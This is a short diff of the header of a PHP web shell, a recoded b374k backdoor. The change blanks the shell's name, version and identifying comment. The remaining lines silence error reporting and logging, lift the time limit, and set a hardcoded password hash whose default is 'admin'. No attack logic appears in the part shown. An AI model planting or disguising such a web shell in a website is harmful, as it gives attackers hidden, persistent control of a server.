@@ -1,5 +1,5 @@
 <?php
-## recoded b374k shell
+## recoded 
 error_reporting(0);
 @set_time_limit(0);
 @ini_set('display_errors','0');
@@ -7,8 +7,8 @@ error_reporting(0);
 @ini_set('log_errors','0');
 @clearstatcache();
 
-$s_name = "w3b"; // shell name
-$s_ver = "4dm1n"; // shell ver
+$s_name = ""; // shell name
+$s_ver = ""; // shell ver
 $s_title = $s_name." ".$s_ver; // shell title
 $s_pass = "eae2bfa24f83682cb2954ce015f8fbf1"; // default : admin
 $s_color = "ff0000"; // shell theme color, default : 4c83af
